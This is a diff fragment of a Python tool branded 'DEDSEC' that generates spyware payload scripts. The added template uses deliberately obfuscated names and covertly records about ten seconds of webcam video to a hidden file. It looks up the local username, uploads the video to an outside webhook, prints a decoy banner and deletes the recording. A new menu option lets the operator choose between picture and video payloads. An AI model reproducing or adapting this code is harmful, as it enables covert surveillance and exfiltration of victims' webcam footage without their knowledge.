+    JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu = (JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1hiStt1rnu4Eu.decode().strip())
+    break
+
+def i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dVZ8(i40hiSB9b8dsVZ8HZGi40hiSB9b8dsV=None):
+    if i40hiSB9b8dsVZ8HZGi40hiSB9b8dsV is None:
+        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsV = 10 
+
+    i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8 = cv2.VideoCapture(0)
+    i40h1SB9b8dsVZGi40h1SB9b8dsV = 10.0
+
+    i40hiSB9b8dsVZGi40hiSB9b8dsV = cv2.VideoWriter_fourcc(*'XVID')
+    i40hiSB9b8dsVZGi40h1SB9b8dsV = cv2.VideoWriter('.c.avi', i40hiSB9b8dsVZGi40hiSB9b8dsV, i40h1SB9b8dsVZGi40h1SB9b8dsV, (640, 480))
+    i40h1SB9b8dsvZGi40h1SB9b8dsV = int(1000 / i40h1SB9b8dsVZGi40h1SB9b8dsV)
+
+    i40h1SB9b8dsvZGi40h1SB9b8dSV = cv2.getTickCount()
+    i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 = 0
+
+    while True:
+        ret, i40hiS40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 = i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8.read()
+        if not ret:
+            break
+
+        i40hiSB9b8dsVZGi40h1SB9b8dsV.write(i40hiS40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8)
+
+        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 += 1
+
+        i40hiS40hiSB9b8dsVZ8HZtN8MAG3ue3nFj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 = (cv2.getTickCount() - i40h1SB9b8dsvZGi40h1SB9b8dSV) / cv2.getTickFrequency()
+        if i40hiS40hiSB9b8dsVZ8HZtN8MAG3ue3nFj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 >= i40hiSB9b8dsVZ8HZGi40hiSB9b8dsV:
+            break
+
+        i48dsVZ8HZtN8MAG3ue3nFj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 = i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 * i40h1SB9b8dsvZGi40h1SB9b8dsV - i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 * 1000
+        if i48dsVZ8HZtN8MAG3ue3nFj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8 > 0:
+            cv2.waitKey(int(i48dsVZ8HZtN8MAG3ue3nFj8y0hrNu4Euj8yTJLjYJcJGi40hiSB9b8))
+
+    i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8.release()
+    i40hiSB9b8dsVZGi40h1SB9b8dsV.release()
+
+    cv2.destroyAllWindows()
+
+def ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40):
+    return ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40.swapcase()
+
+def i40hiSB9b8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y(i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN, JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu):
+    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = '{n_v_1}'
+    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf7 = '{n_v_2}'
+    f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq = '.'
+    f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq = 'A'
+
+    nAOsUFdh8tN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJCg = ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6)
+    nAOsUFdh8tN8MAG3ue3nFttiirNu4Euj8yTJLjYJcJCg = ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf7)
+    B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = nAOsUFdh8tN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJCg.replace(f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq, f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq)
+    B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40h1SB9b8dsVZ8HZGi40hiS = nAOsUFdh8tN8MAG3ue3nFttiirNu4Euj8yTJLjYJcJCg.replace(f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq, f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq)
+    
+    B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6(B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS, B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40h1SB9b8dsVZ8HZGi40hiS)
+
+    B9b8dsVZ8VUiNpJWciiXkfF6MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS
+    MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJc = UiNpJWciiXk(url=B9b8dsVZ8VUiNpJWciiXkfF6MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS, username=JcJGi40h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG140hiStt1rnu4Eu)
+
+    with open(i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN, "rb") as f:
+        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = f.read()
+        MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJc.add_file(file=i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8, filename=os.path.basename(i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN))
+        response = MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJc.execute()
+
+if __name__ == "__main__":
+    MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFirNu4Euj8yTJLjYJc = {duration}
+
+    if MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFirNu4Euj8yTJLjYJc:
+        MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFirNu4Euj8yTJLjYJc = float(MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFirNu4Euj8yTJLjYJc)
+    i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dVZ8(MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFirNu4Euj8yTJLjYJc)
+
+    i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y = ".c.avi"
+
+    if os.path.exists(i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y):
+        JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirNu4Eu = subprocess.check_output(['getent','passwd', '1000'])
+        ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi10 = JcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSttirNu4Eu.decode().split()
+
+        for b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Eu in ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi10:
+            b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFttt1rNu4Eu = 'echo "' + JcJG140h1SB9b8dsVZ8HZG140hiSB9b8dsVZ8HZG1h1Stt1rnu4Eu  + '" | cut -d: -f1'
+            b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nF1tt1rNu4Eu = subprocess.check_output(b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFttt1rNu4Eu, shell=True)
+            i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hi1SB9b8dsVZ83ue3nFtttirNu4Euj8y = (b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nF1tt1rNu4Eu.decode().strip())
+            break
+
+        i40hiSB9b8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y(i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hiSB9b8dsVZ83ue3nFtttirNu4Euj8y, i40hiSb8dsViXkfF6MMHNow78zyU6MMHNowSB9b8dsVZ8HZGi40hi1SB9b8dsVZ83ue3nFtttirNu4Euj8y)
+        print(banner)
+        os.remove('.c.avi')
+
+    else:
+        pass
+
+""")
+
+    print()
+    print(tabulate([['PAYLOAD GENERATED:', f'{payload_name}.py']], tablefmt='fancy_grid'))
+
 def setup_webhook():
     file_name = ".w.txt"
     try:
@@ -306,7 +531,16 @@ def menu():
     print(((purple)), (banner1))
     select = input('\n\t[?] DEDSEC: ')
     if select == '1':
-        create_payload()
+        print()
+        print(tabulate([['What do you want to see ?']], tablefmt='fancy_grid'))
+        print(tabulate([['1.','PICTURE'], ['2.','VIDEO']], tablefmt='fancy_grid'))
+        select = input('SELECT: ')
+        if select == '1':
+            create_payload()
+        elif select == '2':
+            create_payload_vid()
+        else:
+            return menu()
     elif select == '2':
         setup_webhook()
     elif select == '0':
